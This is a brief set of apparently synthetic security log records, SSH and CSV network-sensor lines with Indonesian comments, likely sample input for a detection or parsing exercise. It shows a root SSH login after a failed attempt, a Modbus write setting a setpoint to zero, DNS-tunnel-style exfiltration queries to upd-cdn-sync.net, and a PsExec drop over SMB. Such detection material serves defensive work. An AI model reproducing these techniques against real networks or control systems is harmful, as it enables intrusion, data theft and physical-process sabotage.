Nov 14 02:11:17 srv-mail sshd[2227]: Failed password for root from 91.240.118.172 port 50270 ssh2
Nov 14 02:11:19 srv-mail sshd[2229]: Accepted password for root from 91.240.118.172 port 50288 ssh2
# Format 2: CSV sensor jaringan  (waktu,src_ip,dst_ip,proto,port,tipe,atribut=nilai;...)
2026-11-14T02:20:00Z,10.10.1.23,10.10.20.10,modbus,502,modbus,fc=43;detail=Read Device ID
2026-11-14T02:20:04Z,10.10.1.23,10.10.20.10,modbus,502,modbus,fc=6;detail=Write Single Register SETPOINT=0
2026-11-14T02:21:00Z,10.10.1.24,10.10.1.10,dns,53,dns,query=q8f7a6sd5f4g3h2j1k0l9z8x7c6v5b4n3m2a1s2d3f4g5h6j7.upd-cdn-sync.net
2026-11-14T02:21:01Z,10.10.1.24,10.10.1.10,dns,53,dns,query=z1x2c3v4b5n6m7a8s9d0f1g2h3j4k5l6q7w8e9r0t1y2u3i4o.upd-cdn-sync.net
2026-11-14T02:21:02Z,10.10.1.24,10.10.1.10,dns,53,dns,query=p0o9i8u7y6t5r4e3w2q1a2s3d4f5g6h7j8k9l0m1n2b3v4c5x.upd-cdn-sync.net
2026-11-14T02:21:03Z,10.10.1.24,10.10.1.10,dns,53,dns,query=m4n5b6v7c8x9z0a1s2d3f4g5h6j7k8l9q0w1e2r3t4y5u6i7o.upd-cdn-sync.net
2026-11-14T02:21:04Z,10.10.1.24,10.10.1.10,dns,53,dns,query=k2j3h4g5f6d7s8a9q0w1e2r3t4y5u6i7o8p9l0k1j2h3g4f5d.upd-cdn-sync.net
2026-11-14T02:22:10Z,10.10.1.22,10.10.1.11,smb,445,conn,share=ADMIN$;detail=PSEXESVC.exe ditulis;kb=300`;
